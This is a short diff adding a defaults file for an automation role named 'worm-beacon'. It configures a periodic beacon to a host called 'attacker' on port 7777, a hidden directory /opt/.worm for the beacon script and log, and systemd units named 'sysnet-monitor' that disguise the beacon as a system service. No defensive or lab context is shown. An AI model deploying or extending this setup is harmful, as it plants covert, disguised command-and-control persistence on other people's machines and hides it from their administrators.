@@ -1,0 +1,11 @@
+---
+# defaults file for worm-beacon
+
+beacon_host: attacker
+beacon_port: 7777
+beacon_schedule: "*:0/7"
+beacon_script: /opt/.worm/beacon.sh
+beacon_log: /opt/.worm/beacon.log
+worm_dir: /opt/.worm
+beacon_timer_unit: "sysnet-monitor.timer"
+beacon_service_unit: "sysnet-monitor.service"
